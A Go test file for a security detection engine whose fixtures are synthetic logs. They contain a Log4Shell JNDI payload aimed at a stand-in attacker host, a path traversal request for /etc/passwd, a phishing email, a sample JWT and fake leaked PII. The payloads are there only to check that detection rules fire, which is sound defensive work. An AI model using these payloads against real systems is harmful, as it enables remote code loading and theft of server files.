package detection

import "testing"

func TestRuleFires(t *testing.T) {
	text := `=== SYSTEM LOG GENERATED: 2026-06-23T12:34:00Z ===
HOST: prod-app-srv-04
[INFO] Processing standard internal routing requests...
[INFO] User session initialized safely for UID: 48293.

[WARN] Incoming request flagged by edge proxy:
Source IP: 198.51.100.12
User-Agent: Mozilla/5.0 (Custom Security Scanner)
Payload: GET /api/v1/auth/login?user=${jndi:ldap://attacker-controlled-server.com/a} HTTP/1.1
Header-Dump: Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

[INFO] Routing request to compliance auditing parsing engine...
[DEBUG] Checking database string exports for archiving metadata.
Query Exported: INSERT INTO 'users' (id, username, password_hash) VALUES (1, 'admin', '$2b$12$K3...';

[SECURITY ALERT] Mail gateway intercepted outbound message payload:
From: security-alerts@sec-login-microsoft.com
To: cfo-office@company.com
Subject: ACTION REQUIRED: Verify your account immediately!
Body: "We detected suspicious account activity on your cloud tenant. 
Please update your credentials immediately by visiting the secure link: 
https://bit.ly/update-sys-auth-token or check our form at /auth/login.php"

=== END OF LOG TRAIL ===`

	engine := New(DefaultRules)

	ruleMatch := engine.Evaluate(text)
	if len(ruleMatch) > 0 {
		t.Logf("Rules Matched: %v", ruleMatch)
	} else {
		t.Log("No rules matched")
	}

}

func TestRuleDoesNotFire(t *testing.T) {
	textBelowThreshold := `=== DEVELOPMENT BUILD LOG: dev-local-vm ===
[INFO] Starting local compilation of microservices...
[DEBUG] Initializing mock configuration for unit tests.

// Developer Note: Do NOT use production keys here.
// The real AWS Access Key structure looks like: AKIA-EXAMPLE-KEY-123456-LONG-STRING (Do not push this!)
// Hardcoded a mock test pointer for the local schema setup:
var localDbConnectionString = "postgres://dev:local_pass@127.0.0.1:5432/test_db"

[INFO] Hydrating mock database tables for integration tests...
Executing: INSERT INTO 'mock_metrics' (id, metric_name, value) VALUES (1, 'cpu_usage', '22%');

[INFO] Testing internal mail templating engine...
Sending payload to local dev mailbox:
"Hello team, this is an automated test message from the staging pipeline. 
Please review the login flow layout updates at http://localhost:8080/auth/login.php"

[SUCCESS] All 14 local test suites passed. No issues detected.
=== END OF BUILD LOG ===`

	engine := New(DefaultRules)
	ruleMatch := engine.Evaluate(textBelowThreshold)
	if len(ruleMatch) > 0 {
		t.Fatalf("text below threshold, should not match: %v", ruleMatch)

	}
	t.Logf("Success: %v", ruleMatch)
}

func TestMultipleRulesFire(t *testing.T) {
	text := `SYSTEM LOG: prod-web-gateway-01 ===
[INFO] Ingress packet routing initialized.
[ALERT] Core security policy violation detected on listener port 443.

[TRAFFIC DUMP]
Remote_IP: 203.0.113.84
Request: GET /v2/reports/download?file=../../../../etc/passwd HTTP/1.1
User-Agent: Nikto/2.1.6

[SERVER EXCEPTION DETAILS]
Failed to restrict local file inclusion path. System core dumped memory registers.
Buffered output streams emitted un-redacted PII block to unauthenticated socket:
{
    "status": "error_dump",
    "leaked_records": [
        {"user": "j_doe", "tax_id": "000-12-3456", "clearance": "low"},
        {"user": "a_smith", "tax_id": "999-88-7766", "clearance": "high"}
    ]
}
=== END LOG EXCEPTION ===`
	engine := New(DefaultRules)
	ruleMatch := engine.Evaluate(text)
	if len(ruleMatch) <= 1 {
		t.Fatalf("Failed expected multiple rule matches: %v", ruleMatch)
	}
	t.Logf("Success: %v", ruleMatch)
}
